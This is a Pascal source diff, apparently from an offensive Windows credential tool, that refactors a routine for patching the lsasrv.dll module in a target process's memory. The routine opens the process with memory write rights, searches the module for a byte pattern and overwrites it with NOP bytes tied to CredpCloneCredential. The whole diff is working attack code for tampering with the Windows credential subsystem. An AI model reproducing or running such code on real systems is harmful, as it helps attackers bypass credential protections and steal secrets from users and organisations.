@@ -408,13 +408,9 @@ const
   PATC_WN64_CredpCloneCredentialJmpShort:array[0..5] of byte=($90, $90, $90, $90, $90, $90);
 
 var
+  module:string='lsasrv.dll';
   dummy:string;
-  hprocess,hmod:thandle;
-  hmods:array[0..1023] of thandle;
-  MODINFO:  MODULEINFO;
-  cbNeeded,count:	 DWORD;
-  szModName:array[0..254] of char;
-  addr:pointer;
+  hprocess:thandle;
   after,backup:array of byte; //array[0..0] of byte;
   read:cardinal;
   offset:nativeint=0;
@@ -456,7 +452,12 @@ begin
      exit;
      end;
   log('patch pos:'+inttostr(patch_pos ),0);
-
+  //
+  if search_module_mem (pid,module,pattern,offset)=false then
+     begin
+     log('search_module_mem NOT OK');
+     exit;
+     end;
   //
   hprocess:=thandle(-1);
   hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
@@ -464,29 +465,6 @@ begin
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
-       cbneeded:=0;
-       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
-               begin
-               log('EnumProcessModules OK',0);
-
-               for count:=0 to cbneeded div sizeof(thandle) do
-                   begin
-                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
-                      begin
-                      dummy:=lowercase(strpas(szModName ));
-                      //writeln(dummy); //debug
-                      if pos('lsasrv.dll',dummy)>0 then
-                         begin
-                         log('lsasrv.dll found:'+inttohex(hMods[count],8),0);
-                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
-                            begin
-                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
-                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
-                            addr:=MODINFO.lpBaseOfDll;
-                            log('Searching...',0);
-                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
-                            log('Done!',0);
                             if offset<>0 then
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
@@ -511,8 +489,8 @@ begin
                                         end;
                                         end
                                         else log('patch0 failed',1);
-                                   end;
-                                 end;
+                                   end; //if ReadMem
+                                 end;  //if offset<>0
                             {//test - lets read first 4 bytes of our module
                              //can be verified with process hacker
                             if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
@@ -521,12 +499,6 @@ begin
                                log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                                end;
                             }
-                            end;//if GetModuleInformation...
-                         break; //no need to search other modules...
-                         end; //if pos('samsrv.dll',dummy)>0 then
-                      end; //if GetModuleFileNameExA
-                   end; //for count:=0...
-               end; //if EnumProcessModules...
        closehandle(hprocess);
        end;//if openprocess...
 
